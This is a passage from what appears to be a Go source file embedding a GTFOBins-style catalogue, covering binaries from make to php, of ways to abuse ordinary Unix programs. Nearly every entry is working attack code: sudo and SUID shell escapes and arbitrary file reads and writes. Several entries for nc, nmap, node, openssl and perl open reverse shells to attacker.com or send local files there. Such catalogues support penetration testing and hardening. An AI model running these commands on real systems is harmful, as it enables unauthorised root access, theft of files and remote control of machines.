make -s --eval="\$(file >$LFILE,DATA)" .
`, "code"},
		},
		"suid": []Functions{
			Functions{`COMMAND='/bin/sh -p'
./make -s --eval=$'x:\n\t-'"$COMMAND"
`, "code"},
		},
		"sudo": []Functions{
			Functions{`COMMAND='/bin/sh'
sudo make -s --eval=$'x:\n\t-'"$COMMAND"
`, "code"},
		},
		"shell": []Functions{
			Functions{`COMMAND='/bin/sh'
make -s --eval=$'x:\n\t-'"$COMMAND"
`, "code"},
		},
	},
	"man": map[string][]Functions{
		"shell": []Functions{
			Functions{`man man
!/bin/sh
`, "code"},
			Functions{`This only works for GNU 'man' and requires GNU 'troff' ('groff' to be installed).`, "description"},
			Functions{`man '-H/bin/sh #' man
`, "code"},
		},
		"file-read": []Functions{
			Functions{`man file_to_read`, "code"},
		},
		"sudo": []Functions{
			Functions{`sudo man man
!/bin/sh
`, "code"},
		},
	},
	"mawk": map[string][]Functions{
		"suid": []Functions{
			Functions{`LFILE=file_to_read
./mawk '//' "$LFILE"
`, "code"},
		},
		"sudo": []Functions{
			Functions{`sudo mawk 'BEGIN {system("/bin/sh")}'`, "code"},
		},
		"limited-suid": []Functions{
			Functions{`./mawk 'BEGIN {system("/bin/sh")}'`, "code"},
		},
		"shell": []Functions{
			Functions{`mawk 'BEGIN {system("/bin/sh")}'`, "code"},
		},
		"file-write": []Functions{
			Functions{`LFILE=file_to_write
mawk -v LFILE=$LFILE 'BEGIN { print "DATA" > LFILE }'
`, "code"},
		},
		"file-read": []Functions{
			Functions{`LFILE=file_to_read
mawk '//' "$LFILE"
`, "code"},
		},
	},
	"more": map[string][]Functions{
		"shell": []Functions{
			Functions{`TERM= more /etc/profile
!/bin/sh
`, "code"},
		},
		"file-read": []Functions{
			Functions{`more file_to_read`, "code"},
		},
		"suid": []Functions{
			Functions{`./more file_to_read`, "code"},
		},
		"sudo": []Functions{
			Functions{`TERM= sudo more /etc/profile
!/bin/sh
`, "code"},
		},
	},
	"mount": map[string][]Functions{
		"sudo": []Functions{
			Functions{`Exploit the fact that 'mount' can be executed via 'sudo' to *replace* the 'mount' binary with a shell.`, "description"},
			Functions{`sudo mount -o bind /bin/sh /bin/mount
sudo mount
`, "code"},
		},
	},
	"msgattrib": map[string][]Functions{
		"file-read": []Functions{
			Functions{`LFILE=file_to_read
msgattrib -P $LFILE
`, "code"},
		},
		"sudo": []Functions{
			Functions{`LFILE=file_to_read
sudo msgattrib -P $LFILE
`, "code"},
		},
		"suid": []Functions{
			Functions{`LFILE=file_to_read
./msgattrib -P $LFILE
`, "code"},
		},
	},
	"msgcat": map[string][]Functions{
		"suid": []Functions{
			Functions{`LFILE=file_to_read
./msgcat -P $LFILE
`, "code"},
		},
		"file-read": []Functions{
			Functions{`LFILE=file_to_read
msgcat -P $LFILE
`, "code"},
		},
		"sudo": []Functions{
			Functions{`LFILE=file_to_read
sudo msgcat -P $LFILE
`, "code"},
		},
	},
	"msgconv": map[string][]Functions{
		"file-read": []Functions{
			Functions{`LFILE=file_to_read
msgconv -P $LFILE
`, "code"},
		},
		"sudo": []Functions{
			Functions{`LFILE=file_to_read
sudo msgconv -P $LFILE
`, "code"},
		},
		"suid": []Functions{
			Functions{`LFILE=file_to_read
./msgconv -P $LFILE
`, "code"},
		},
	},
	"msgfilter": map[string][]Functions{
		"suid": []Functions{
			Functions{`Any text file will do as the input (use '-i'). 'kill' is needed to spawn the shell only once.`, "description"},
			Functions{`echo x | ./msgfilter -P /bin/sh -p -c '/bin/sh -p 0<&2 1>&2; kill $PPID'
`, "code"},
		},
		"shell": []Functions{
			Functions{`Any text file will do as the input (use '-i'). 'kill' is needed to spawn the shell only once.`, "description"},
			Functions{`echo x | msgfilter -P /bin/sh -c '/bin/sh 0<&2 1>&2; kill $PPID'
`, "code"},
		},
		"file-read": []Functions{
			Functions{`The file is parsed and displayed as a Java '.properties' file, so this may not be suitable to read arbitrary binary data. '/bin/cat' can be replaced with any other *filter* program.`, "description"},
			Functions{`LFILE=file_to_read
msgfilter -P -i "LFILE" /bin/cat
`, "code"},
		},
		"sudo": []Functions{
			Functions{`Any text file will do as the input (use '-i'). 'kill' is needed to spawn the shell only once.`, "description"},
			Functions{`echo x | sudo msgfilter -P /bin/sh -c '/bin/sh 0<&2 1>&2; kill $PPID'
`, "code"},
		},
	},
	"msgmerge": map[string][]Functions{
		"suid": []Functions{
			Functions{`LFILE=file_to_read
./msgmerge -P $LFILE /dev/null
`, "code"},
		},
		"file-read": []Functions{
			Functions{`LFILE=file_to_read
msgmerge -P $LFILE /dev/null
`, "code"},
		},
		"sudo": []Functions{
			Functions{`LFILE=file_to_read
sudo msgmerge -P $LFILE /dev/null
`, "code"},
		},
	},
	"msguniq": map[string][]Functions{
		"file-read": []Functions{
			Functions{`LFILE=file_to_read
msguniq -P $LFILE
`, "code"},
		},
		"sudo": []Functions{
			Functions{`LFILE=file_to_read
sudo msguniq -P $LFILE
`, "code"},
		},
		"suid": []Functions{
			Functions{`LFILE=file_to_read
./msguniq -P $LFILE
`, "code"},
		},
	},
	"mtr": map[string][]Functions{
		"file-read": []Functions{
			Functions{`LFILE=file_to_read
mtr --raw -F "$LFILE"
`, "code"},
		},
		"sudo": []Functions{
			Functions{`LFILE=file_to_read
sudo mtr --raw -F "$LFILE"
`, "code"},
		},
	},
	"mv": map[string][]Functions{
		"sudo": []Functions{
			Functions{`LFILE=file_to_write
TF=$(mktemp)
echo "DATA" > $TF
sudo mv $TF $LFILE
`, "code"},
		},
		"suid": []Functions{
			Functions{`LFILE=file_to_write
TF=$(mktemp)
echo "DATA" > $TF
./mv $TF $LFILE
`, "code"},
		},
	},
	"mysql": map[string][]Functions{
		"library-load": []Functions{
			Functions{`A MySQL server must accept connections in order for this to work.

The following loads the '/path/to/lib.so' shared object.
`, "description"},
			Functions{`mysql --default-auth ../../../../../path/to/lib`, "code"},
		},
		"shell": []Functions{
			Functions{`mysql -e '\! /bin/sh'`, "code"},
		},
		"sudo": []Functions{
			Functions{`sudo mysql -e '\! /bin/sh'`, "code"},
		},
		"limited-suid": []Functions{
			Functions{`./mysql -e '\! /bin/sh'`, "code"},
		},
	},
	"nano": map[string][]Functions{
		"limited-suid": []Functions{
			Functions{`The 'SPELL' environment variable can be used in place of the '-s' option if the command line cannot be changed.`, "description"},
			Functions{`./nano -s /bin/sh
/bin/sh
^T
`, "code"},
		},
		"sudo": []Functions{
			Functions{`sudo nano
^R^X
reset; sh 1>&0 2>&0
`, "code"},
		},
		"shell": []Functions{
			Functions{`nano
^R^X
reset; sh 1>&0 2>&0
`, "code"},
			Functions{`The 'SPELL' environment variable can be used in place of the '-s' option if the command line cannot be changed.`, "description"},
			Functions{`nano -s /bin/sh
/bin/sh
^T
`, "code"},
		},
		"file-write": []Functions{
			Functions{`nano file_to_write
DATA
^O
`, "code"},
		},
		"file-read": []Functions{
			Functions{`nano file_to_read`, "code"},
		},
	},
	"nasm": map[string][]Functions{
		"file-read": []Functions{
			Functions{`LFILE=file_to_read
nasm -@ $LFILE
`, "code"},
		},
		"suid": []Functions{
			Functions{`LFILE=file_to_read
./nasm -@ $LFILE
`, "code"},
		},
		"sudo": []Functions{
			Functions{`LFILE=file_to_read
sudo nasm -@ $LFILE
`, "code"},
		},
	},
	"nawk": map[string][]Functions{
		"file-write": []Functions{
			Functions{`LFILE=file_to_write
nawk -v LFILE=$LFILE 'BEGIN { print "DATA" > LFILE }'
`, "code"},
		},
		"file-read": []Functions{
			Functions{`LFILE=file_to_read
nawk '//' "$LFILE"
`, "code"},
		},
		"suid": []Functions{
			Functions{`LFILE=file_to_read
./nawk '//' "$LFILE"
`, "code"},
		},
		"sudo": []Functions{
			Functions{`sudo nawk 'BEGIN {system("/bin/sh")}'`, "code"},
		},
		"limited-suid": []Functions{
			Functions{`./nawk 'BEGIN {system("/bin/sh")}'`, "code"},
		},
		"shell": []Functions{
			Functions{`nawk 'BEGIN {system("/bin/sh")}'`, "code"},
		},
		"non-interactive-reverse-shell": []Functions{
			Functions{`Run 'nc -l -p 12345' on the attacker box to receive the shell.`, "description"},
			Functions{`RHOST=attacker.com
RPORT=12345
nawk -v RHOST=$RHOST -v RPORT=$RPORT 'BEGIN {
    s = "/inet/tcp/0/" RHOST "/" RPORT;
    while (1) {printf "> " |& s; if ((s |& getline c) <= 0) break;
    while (c && (c |& getline) > 0) print $0 |& s; close(c)}}'
`, "code"},
		},
		"non-interactive-bind-shell": []Functions{
			Functions{`Run 'nc target.com 12345' on the attacker box to connect to the shell.`, "description"},
			Functions{`LPORT=12345
nawk -v LPORT=$LPORT 'BEGIN {
    s = "/inet/tcp/" LPORT "/0/0";
    while (1) {printf "> " |& s; if ((s |& getline c) <= 0) break;
    while (c && (c |& getline) > 0) print $0 |& s; close(c)}}'
`, "code"},
		},
	},
	"nc": map[string][]Functions{
		"reverse-shell": []Functions{
			Functions{`RHOST=attacker.com
RPORT=12345
nc -e /bin/sh $RHOST $RPORT
`, "code"},
			Functions{`Run 'nc -l -p 12345' on the attacker box to receive the shell. This only works with netcat traditional.`, "description"},
		},
		"bind-shell": []Functions{
			Functions{`Run 'nc target.com 12345' on the attacker box to connect to the shell. This only works with netcat traditional.`, "description"},
			Functions{`LPORT=12345
nc -l -p $LPORT -e /bin/sh
`, "code"},
		},
		"file-upload": []Functions{
			Functions{`RHOST=attacker.com
RPORT=12345
LFILE=file_to_send
nc $RHOST $RPORT < "$LFILE"
`, "code"},
			Functions{`Send a local file via TCP. Run 'nc -l -p 12345 > "file_to_save"' on the attacker box to collect the file.`, "description"},
		},
		"file-download": []Functions{
			Functions{`Fetch a remote file via TCP. Run 'nc target.com 12345 < "file_to_send"' on the attacker box to send the file.`, "description"},
			Functions{`LPORT=12345
LFILE=file_to_save
nc -l -p $LPORT > "$LFILE"
`, "code"},
		},
		"sudo": []Functions{
			Functions{`Run 'nc -l -p 12345' on the attacker box to receive the shell. This only works with netcat traditional.`, "description"},
			Functions{`RHOST=attacker.com
RPORT=12345
sudo nc -e /bin/sh $RHOST $RPORT
`, "code"},
		},
		"limited-suid": []Functions{
			Functions{`Run 'nc -l -p 12345' on the attacker box to receive the shell. This only works with netcat traditional.`, "description"},
			Functions{`RHOST=attacker.com
RPORT=12345
./nc -e /bin/sh $RHOST $RPORT
`, "code"},
		},
	},
	"neofetch": map[string][]Functions{
		"file-read": []Functions{
			Functions{`LFILE=file_to_read
neofetch --ascii $LFILE
`, "code"},
		},
		"sudo": []Functions{
			Functions{`LFILE=file_to_read
sudo neofetch --ascii $LFILE
`, "code"},
		},
	},
	"nice": map[string][]Functions{
		"suid": []Functions{
			Functions{`./nice /bin/sh -p`, "code"},
		},
		"sudo": []Functions{
			Functions{`sudo nice /bin/sh`, "code"},
		},
		"shell": []Functions{
			Functions{`nice /bin/sh`, "code"},
		},
	},
	"nl": map[string][]Functions{
		"suid": []Functions{
			Functions{`LFILE=file_to_read
./nl -bn -w1 -s '' $LFILE
`, "code"},
		},
		"sudo": []Functions{
			Functions{`LFILE=file_to_read
sudo nl -bn -w1 -s '' $LFILE
`, "code"},
		},
		"file-read": []Functions{
			Functions{`LFILE=file_to_read
nl -bn -w1 -s '' $LFILE
`, "code"},
		},
	},
	"nmap": map[string][]Functions{
		"file-upload": []Functions{
			Functions{`Send a local file via TCP. Run 'socat -v tcp-listen:8080,reuseaddr,fork - on the attacker box to collect the file or use a proper HTTP server. Note that multiple connections are made to the server. Also, it is important that the port is a commonly used HTTP like 80 or 8080.`, "description"},
			Functions{`RHOST=attacker.com
RPORT=8080
LFILE=file_to_send
nmap -p $RPORT $RHOST --script http-put --script-args http-put.url=/,http-put.file=$LFILE
`, "code"},
			Functions{`Send a local file via TCP. Run 'nc -l -p 12345 > "file_to_save"' on the attacker box to collect the file.`, "description"},
			Functions{`export RHOST=attacker.com
export RPORT=12345
export LFILE=file_to_send
TF=$(mktemp)
echo 'local f=io.open(os.getenv("LFILE"), 'rb')
local d=f:read("*a")
io.close(f);
local s=require("socket");
local t=assert(s.tcp());
t:connect(os.getenv("RHOST"),os.getenv("RPORT"));
t:send(d);
t:close();' > $TF
nmap --script=$TF
`, "code"},
		},
		"file-read": []Functions{
			Functions{`TF=$(mktemp)
echo 'local f=io.open("file_to_read", "rb"); print(f:read("*a")); io.close(f);' > $TF
nmap --script=$TF
`, "code"},
		},
		"non-interactive-bind-shell": []Functions{
			Functions{`Run 'nc target.com 12345' on the attacker box to connect to the shell.`, "description"},
			Functions{`export LPORT=12345
TF=$(mktemp)
echo 'local k=require("socket");
local s=assert(k.bind("*",os.getenv("LPORT")));
local c=s:accept();
while true do
  local r,x=c:receive();local f=assert(io.popen(r,"r"));
  local b=assert(f:read("*a"));c:send(b);
end;c:close();f:close();' > $TF
nmap --script=$TF
`, "code"},
		},
		"file-download": []Functions{
			Functions{`RHOST=attacker.com
RPORT=8080
TF=$(mktemp -d)
LFILE=file_to_save
nmap -p $RPORT $RHOST --script http-fetch --script-args http-fetch.destination=$TF,http-fetch.url=$LFILE
`, "code"},
			Functions{`Fetch a remote file via TCP. Run a proper HTTP server on the attacker box to send the file, e.g., 'php -S 0.0.0.0:8080'. Note that multiple connections are made to the server and the result is placed in '$TF/IP/PORT/PATH'. Also, it is important that the port is a commonly used HTTP like 80 or 8080.`, "description"},
			Functions{`Fetch a remote file via TCP. Run 'nc target.com 12345 < "file_to_send"' on the attacker box to send the file.`, "description"},
			Functions{`export LPORT=12345
export LFILE=file_to_save
TF=$(mktemp)
echo 'local k=require("socket");
local s=assert(k.bind("*",os.getenv("LPORT")));
local c=s:accept();
local d,x=c:receive("*a");
c:close();
local f=io.open(os.getenv("LFILE"), "wb");
f:write(d);
io.close(f);' > $TF
nmap --script=$TF
`, "code"},
		},
		"file-write": []Functions{
			Functions{`TF=$(mktemp)
echo 'local f=io.open("file_to_write", "wb"); f:write("data"); io.close(f);' > $TF
nmap --script=$TF
`, "code"},
			Functions{`The payload appears inside the regular nmap output.`, "description"},
			Functions{`LFILE=file_to_write
nmap -oG=$LFILE DATA
`, "code"},
		},
		"sudo": []Functions{
			Functions{`Input echo is disabled.`, "description"},
			Functions{`TF=$(mktemp)
echo 'os.execute("/bin/sh")' > $TF
sudo nmap --script=$TF
`, "code"},
			Functions{`The interactive mode, available on versions 2.02 to 5.21, can be used to execute shell commands.`, "description"},
			Functions{`sudo nmap --interactive
nmap> !sh
`, "code"},
		},
		"limited-suid": []Functions{
			Functions{`Input echo is disabled.`, "description"},
			Functions{`TF=$(mktemp)
echo 'os.execute("/bin/sh")' > $TF
./nmap --script=$TF
`, "code"},
		},
		"suid": []Functions{
			Functions{`The payload appears inside the regular nmap output.`, "description"},
			Functions{`LFILE=file_to_write
./nmap -oG=$LFILE DATA
`, "code"},
		},
		"shell": []Functions{
			Functions{`Input echo is disabled.`, "description"},
			Functions{`TF=$(mktemp)
echo 'os.execute("/bin/sh")' > $TF
nmap --script=$TF
`, "code"},
			Functions{`The interactive mode, available on versions 2.02 to 5.21, can be used to execute shell commands.`, "description"},
			Functions{`nmap --interactive
nmap> !sh
`, "code"},
		},
		"non-interactive-reverse-shell": []Functions{
			Functions{`Run ''nc -l -p 12345'' on the attacker box to receive the shell.`, "description"},
			Functions{`export RHOST=attacker.com
export RPORT=12345
TF=$(mktemp)
echo 'local s=require("socket");
local t=assert(s.tcp());
t:connect(os.getenv("RHOST"),os.getenv("RPORT"));
while true do
  local r,x=t:receive();local f=assert(io.popen(r,"r"));
  local b=assert(f:read("*a"));t:send(b);
end;
f:close();t:close();' > $TF
nmap --script=$TF
`, "code"},
		},
	},
	"node": map[string][]Functions{
		"file-read": []Functions{
			Functions{`node -e 'process.stdout.write(fs.readFileSync("/bin/ls"))'`, "code"},
		},
		"file-download": []Functions{
			Functions{`Fetch a remote file via HTTP GET request.`, "description"},
			Functions{`export URL=http://attacker.com/file_to_get
export LFILE=file_to_save
node -e 'http.get(process.env.URL, res => res.pipe(fs.createWriteStream(process.env.LFILE)))'
`, "code"},
		},
		"shell": []Functions{
			Functions{`node -e 'child_process.spawn("/bin/sh", {stdio: [0, 1, 2]})'
`, "code"},
		},
		"file-upload": []Functions{
			Functions{`Send a local file via HTTP POST request.`, "description"},
			Functions{`export URL=http://attacker.com
export LFILE=file_to_send
node -e 'fs.createReadStream(process.env.LFILE).pipe(http.request(process.env.URL))'
`, "code"},
		},
		"reverse-shell": []Functions{
			Functions{`Run 'nc -l -p 12345' on the attacker box to receive the shell.`, "description"},
			Functions{`export RHOST=attacker.com
export RPORT=12345
node -e 'sh = child_process.spawn("/bin/sh");
net.connect(process.env.RPORT, process.env.RHOST, function () {
  this.pipe(sh.stdin);
  sh.stdout.pipe(this);
  sh.stderr.pipe(this);
})'
`, "code"},
		},
		"bind-shell": []Functions{
			Functions{`Run 'nc target.com 12345' on the attacker box to connect to the shell.`, "description"},
			Functions{`export LPORT=12345
node -e 'sh = child_process.spawn("/bin/sh");
net.createServer(function (client) {
  client.pipe(sh.stdin);
  sh.stdout.pipe(client);
  sh.stderr.pipe(client);
}).listen(process.env.LPORT)'
`, "code"},
		},
		"suid": []Functions{
			Functions{`./node -e 'child_process.spawn("/bin/sh", ["-p"], {stdio: [0, 1, 2]})'
`, "code"},
		},
		"sudo": []Functions{
			Functions{`sudo node -e 'child_process.spawn("/bin/sh", {stdio: [0, 1, 2]})'
`, "code"},
		},
		"capabilities": []Functions{
			Functions{`./node -e 'process.setuid(0); child_process.spawn("/bin/sh", {stdio: [0, 1, 2]})'
`, "code"},
		},
		"file-write": []Functions{
			Functions{`node -e 'fs.writeFileSync("file_to_write", "DATA")'`, "code"},
		},
	},
	"nohup": map[string][]Functions{
		"suid": []Functions{
			Functions{`./nohup /bin/sh -p -c "sh -p <$(tty) >$(tty) 2>$(tty)"`, "code"},
		},
		"sudo": []Functions{
			Functions{`sudo nohup /bin/sh -c "sh <$(tty) >$(tty) 2>$(tty)"`, "code"},
		},
		"shell": []Functions{
			Functions{`nohup /bin/sh -c "sh <$(tty) >$(tty) 2>$(tty)"`, "code"},
		},
		"command": []Functions{
			Functions{`COMMAND='/usr/bin/id'
nohup "$COMMAND"
cat nohup.out
`, "code"},
		},
	},
	"npm": map[string][]Functions{
		"shell": []Functions{
			Functions{`npm exec /bin/sh`, "code"},
			Functions{`Additionally, arbitrary script names can be used in place of 'preinstall' and triggered by name with, e.g., 'npm -C $TF run preinstall'.`, "description"},
			Functions{`TF=$(mktemp -d)
echo '{"scripts": {"preinstall": "/bin/sh"}}' > $TF/package.json
npm -C $TF i
`, "code"},
		},
		"sudo": []Functions{
			Functions{`Additionally, arbitrary script names can be used in place of 'preinstall' and triggered by name with, e.g., 'npm -C $TF run preinstall'.`, "description"},
			Functions{`TF=$(mktemp -d)
echo '{"scripts": {"preinstall": "/bin/sh"}}' > $TF/package.json
sudo npm -C $TF --unsafe-perm i
`, "code"},
		},
	},
	"nroff": map[string][]Functions{
		"file-read": []Functions{
			Functions{`The file is typeset and some warning messages may appear.`, "description"},
			Functions{`LFILE=file_to_read
nroff $LFILE
`, "code"},
		},
		"shell": []Functions{
			Functions{`TF=$(mktemp -d)
echo '#!/bin/sh' > $TF/groff
echo '/bin/sh' >> $TF/groff
chmod +x $TF/groff
GROFF_BIN_PATH=$TF nroff
`, "code"},
		},
		"sudo": []Functions{
			Functions{`TF=$(mktemp -d)
echo '#!/bin/sh' > $TF/groff
echo '/bin/sh' >> $TF/groff
chmod +x $TF/groff
sudo GROFF_BIN_PATH=$TF nroff
`, "code"},
		},
	},
	"nsenter": map[string][]Functions{
		"shell": []Functions{
			Functions{`nsenter /bin/sh`, "code"},
		},
		"sudo": []Functions{
			Functions{`sudo nsenter /bin/sh`, "code"},
		},
	},
	"octave": map[string][]Functions{
		"limited-suid": []Functions{
			Functions{`./octave-cli --eval 'system("/bin/sh")'`, "code"},
		},
		"shell": []Functions{
			Functions{`octave-cli --eval 'system("/bin/sh")'`, "code"},
		},
		"file-write": []Functions{
			Functions{`octave-cli --eval 'filename = "file_to_write"; fid = fopen(filename, "w"); fputs(fid, "DATA"); fclose(fid);'`, "code"},
		},
		"file-read": []Functions{
			Functions{`octave-cli --eval 'format none; fid = fopen("file_to_read"); while(!feof(fid)); txt = fgetl(fid); disp(txt); endwhile; fclose(fid);'`, "code"},
		},
		"sudo": []Functions{
			Functions{`sudo octave-cli --eval 'system("/bin/sh")'`, "code"},
		},
	},
	"od": map[string][]Functions{
		"suid": []Functions{
			Functions{`LFILE=file_to_read
./od -An -c -w9999 "$LFILE"
`, "code"},
		},
		"sudo": []Functions{
			Functions{`LFILE=file_to_read
sudo od -An -c -w9999 "$LFILE"
`, "code"},
		},
		"file-read": []Functions{
			Functions{`LFILE=file_to_read
od -An -c -w9999 "$LFILE"
`, "code"},
		},
	},
	"openssl": map[string][]Functions{
		"library-load": []Functions{
			Functions{`openssl req -engine ./lib.so`, "code"},
		},
		"reverse-shell": []Functions{
			Functions{`To receive the shell run the following on the attacker box:

    openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes
    openssl s_server -quiet -key key.pem -cert cert.pem -port 12345

Communication between attacker and target will be encrypted.
`, "description"},
			Functions{`RHOST=attacker.com
RPORT=12345
mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect $RHOST:$RPORT > /tmp/s; rm /tmp/s
`, "code"},
		},
		"file-upload": []Functions{
			Functions{`RHOST=attacker.com
RPORT=12345
LFILE=file_to_send
openssl s_client -quiet -connect $RHOST:$RPORT < "$LFILE"
`, "code"},
			Functions{`To collect the file run the following on the attacker box:

    openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes
    openssl s_server -quiet -key key.pem -cert cert.pem -port 12345 > file_to_save

Send a local file via TCP. Transmission will be encrypted.
`, "description"},
		},
		"file-download": []Functions{
			Functions{`To send the file run the following on the attacker box:

    openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes
    openssl s_server -quiet -key key.pem -cert cert.pem -port 12345 < file_to_send

Fetch a file from a TCP port, transmission will be encrypted.
`, "description"},
			Functions{`RHOST=attacker.com
RPORT=12345
LFILE=file_to_save
openssl s_client -quiet -connect $RHOST:$RPORT > "$LFILE"
`, "code"},
		},
		"file-write": []Functions{
			Functions{`LFILE=file_to_write
echo DATA | openssl enc -out "$LFILE"
`, "code"},
			Functions{`LFILE=file_to_write
TF=$(mktemp)
echo "DATA" > $TF
openssl enc -in "$TF" -out "$LFILE"
`, "code"},
		},
		"file-read": []Functions{
			Functions{`LFILE=file_to_read
openssl enc -in "$LFILE"
`, "code"},
		},
		"suid": []Functions{
			Functions{`To receive the shell run the following on the attacker box:

    openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes
    openssl s_server -quiet -key key.pem -cert cert.pem -port 12345

Communication between attacker and target will be encrypted.
`, "description"},
			Functions{`RHOST=attacker.com
RPORT=12345
mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | ./openssl s_client -quiet -connect $RHOST:$RPORT > /tmp/s; rm /tmp/s
`, "code"},
			Functions{`LFILE=file_to_write
echo DATA | openssl enc -out "$LFILE"
`, "code"},
		},
		"sudo": []Functions{
			Functions{`RHOST=attacker.com
RPORT=12345
mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | sudo openssl s_client -quiet -connect $RHOST:$RPORT > /tmp/s; rm /tmp/s
`, "code"},
			Functions{`To receive the shell run the following on the attacker box:

    openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes
    openssl s_server -quiet -key key.pem -cert cert.pem -port 12345

Communication between attacker and target will be encrypted.
`, "description"},
		},
	},
	"openvpn": map[string][]Functions{
		"shell": []Functions{
			Functions{`openvpn --dev null --script-security 2 --up '/bin/sh -c sh'
`, "code"},
		},
		"file-read": []Functions{
			Functions{`The file is actually parsed and the first partial wrong line is returned in an error message.`, "description"},
			Functions{`LFILE=file_to_read
openvpn --config "$LFILE"
`, "code"},
		},
		"suid": []Functions{
			Functions{`./openvpn --dev null --script-security 2 --up '/bin/sh -p -c "sh -p"'
`, "code"},
			Functions{`The file is actually parsed and the first partial wrong line is returned in an error message.`, "description"},
			Functions{`LFILE=file_to_read
./openvpn --config "$LFILE"
`, "code"},
		},
		"sudo": []Functions{
			Functions{`sudo openvpn --dev null --script-security 2 --up '/bin/sh -c sh'
`, "code"},
			Functions{`The file is actually parsed and the first partial wrong line is returned in an error message.`, "description"},
			Functions{`LFILE=file_to_read
sudo openvpn --config "$LFILE"
`, "code"},
		},
	},
	"openvt": map[string][]Functions{
		"sudo": []Functions{
			Functions{`The command execution is blind (displayed on the virtual console), but it is possible to save the output on a temporary file.`, "description"},
			Functions{`COMMAND=id
TF=$(mktemp -u)
sudo openvt -- sh -c "$COMMAND >$TF 2>&1"
cat $TF
`, "code"},
		},
	},
	"paste": map[string][]Functions{
		"file-read": []Functions{
			Functions{`LFILE=file_to_read
paste $LFILE
`, "code"},
		},
		"suid": []Functions{
			Functions{`LFILE=file_to_read
paste $LFILE
`, "code"},
		},
		"sudo": []Functions{
			Functions{`LFILE=file_to_read
sudo paste $LFILE
`, "code"},
		},
	},
	"pax": map[string][]Functions{
		"file-read": []Functions{
			Functions{`The output is a 'tar' archive containing the read file as it is, hence this may not be suitable to read arbitrary binary files.`, "description"},
			Functions{`LFILE=file_to_read
pax -w "$LFILE"
`, "code"},
		},
	},
	"pdb": map[string][]Functions{
		"shell": []Functions{
			Functions{`TF=$(mktemp)
echo 'import os; os.system("/bin/sh")' > $TF
pdb $TF
cont
`, "code"},
		},
		"sudo": []Functions{
			Functions{`TF=$(mktemp)
echo 'import os; os.system("/bin/sh")' > $TF
sudo pdb $TF
cont
`, "code"},
		},
	},
	"pdflatex": map[string][]Functions{
		"file-read": []Functions{
			Functions{`The read file will be part of the output.`, "description"},
			Functions{`pdflatex '\documentclass{article}\usepackage{verbatim}\begin{document}\verbatiminput{file_to_read}\end{document}'
pdftotext article.pdf -
`, "code"},
		},
		"sudo": []Functions{
			Functions{`The read file will be part of the output.`, "description"},
			Functions{`sudo pdflatex '\documentclass{article}\usepackage{verbatim}\begin{document}\verbatiminput{file_to_read}\end{document}'
pdftotext article.pdf -
`, "code"},
			Functions{`sudo pdflatex --shell-escape '\documentclass{article}\begin{document}\immediate\write18{/bin/sh}\end{document}'
`, "code"},
		},
		"limited-suid": []Functions{
			Functions{`./pdflatex --shell-escape '\documentclass{article}\begin{document}\immediate\write18{/bin/sh}\end{document}'
`, "code"},
		},
		"shell": []Functions{
			Functions{`pdflatex --shell-escape '\documentclass{article}\begin{document}\immediate\write18{/bin/sh}\end{document}'
`, "code"},
		},
	},
	"pdftex": map[string][]Functions{
		"sudo": []Functions{
			Functions{`sudo pdftex --shell-escape '\write18{/bin/sh}\end'
`, "code"},
		},
		"limited-suid": []Functions{
			Functions{`./pdftex --shell-escape '\write18{/bin/sh}\end'
`, "code"},
		},
		"shell": []Functions{
			Functions{`pdftex --shell-escape '\write18{/bin/sh}\end'
`, "code"},
		},
	},
	"perf": map[string][]Functions{
		"shell": []Functions{
			Functions{`perf stat /bin/sh
`, "code"},
		},
		"suid": []Functions{
			Functions{`./perf stat /bin/sh -p
`, "code"},
		},
		"sudo": []Functions{
			Functions{`sudo perf stat /bin/sh
`, "code"},
		},
	},
	"perl": map[string][]Functions{
		"reverse-shell": []Functions{
			Functions{`Run 'nc -l -p 12345' on the attacker box to receive the shell.`, "description"},
			Functions{`export RHOST=attacker.com
export RPORT=12345
perl -e 'use Socket;$i="$ENV{RHOST}";$p=$ENV{RPORT};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
`, "code"},
		},
		"suid": []Functions{
			Functions{`./perl -e 'exec "/bin/sh";'`, "code"},
		},
		"sudo": []Functions{
			Functions{`sudo perl -e 'exec "/bin/sh";'`, "code"},
		},
		"capabilities": []Functions{
			Functions{`./perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/sh";'`, "code"},
		},
		"shell": []Functions{
			Functions{`perl -e 'exec "/bin/sh";'`, "code"},
		},
		"file-read": []Functions{
			Functions{`LFILE=file_to_read
perl -ne print $LFILE
`, "code"},
		},
	},
	"pg": map[string][]Functions{
		"sudo": []Functions{
			Functions{`sudo pg /etc/profile
!/bin/sh
`, "code"},
		},
		"suid": []Functions{
			Functions{`./pg file_to_read`, "code"},
		},
		"shell": []Functions{
			Functions{`pg /etc/profile
!/bin/sh
`, "code"},
		},
		"file-read": []Functions{
			Functions{`pg file_to_read`, "code"},
		},
	},
	"php": map[string][]Functions{
		"file-download": []Functions{
			Functions{`export URL=http://attacker.com/file_to_get
export LFILE=file_to_save
php -r '$c=file_get_contents(getenv("URL"));file_put_contents(getenv("LFILE"), $c);'
`, "code"},
			Functions{`Fetch a remote file via HTTP GET request.`, "description"},
		},
		"suid": []Functions{
			Functions{`CMD="/bin/sh"
./php -r "pcntl_exec('/bin/sh', ['-p']);"
`, "code"},
		},
		"file-read": []Functions{
			Functions{`export LFILE=file_to_read
php -r 'readfile(getenv("LFILE"));'
`, "code"},
		},
		"file-write": []Functions{
			Functions{`write data to a file, filename should be absolute.`, "description"},
			Functions{`export LFILE=file_to_write
php -r 'file_put_contents(getenv("LFILE"), "DATA");'
`, "code"},
		},
		"shell": []Functions{
			Functions{`export CMD="/bin/sh"
php -r 'system(getenv("CMD"));'
`, "code"},
			Functions{`export CMD="/bin/sh"
php -r 'passthru(getenv("CMD"));'
`, "code"},
			Functions{`export CMD="/bin/sh"
